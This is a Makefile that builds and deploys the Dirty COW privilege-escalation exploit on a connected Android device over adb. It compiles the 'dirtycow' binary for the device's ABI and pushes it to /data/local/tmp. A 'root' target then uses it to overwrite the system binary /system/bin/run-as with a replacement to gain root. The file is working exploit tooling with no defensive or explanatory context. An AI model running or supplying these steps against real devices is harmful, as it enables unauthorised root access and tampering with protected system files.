
ARCH := $(shell adb shell getprop ro.product.cpu.abi 2>/dev/null)
SDK_VERSION := $(shell adb shell getprop ro.build.version.sdk 2>/dev/null)

# Require a connected device so failures are explicit, not silent empty values.
ifeq ($(strip $(ARCH)),)
$(error No ADB device detected. Connect the Android device and retry.)
endif
ifeq ($(strip $(SDK_VERSION)),)
$(error Could not read Android SDK version from the device.)
endif

all: build

build:
	ndk-build NDK_PROJECT_PATH=. APP_BUILD_SCRIPT=./Android.mk APP_ABI=$(ARCH) APP_PLATFORM=android-$(SDK_VERSION)

push: build
	adb push libs/$(ARCH)/dirtycow /data/local/tmp/dcow
	adb shell 'chmod 777 /data/local/tmp/dcow'

root: push
	adb shell 'chmod 777 /data/local/tmp/dcow'
	adb push libs/$(ARCH)/run-as /data/local/tmp/run-as
	adb shell 'cat /system/bin/run-as > /data/local/tmp/run-as-original'
	adb shell '/data/local/tmp/dcow /data/local/tmp/run-as /system/bin/run-as --no-pad'

clean:
	rm -rf libs
	rm -rf obj

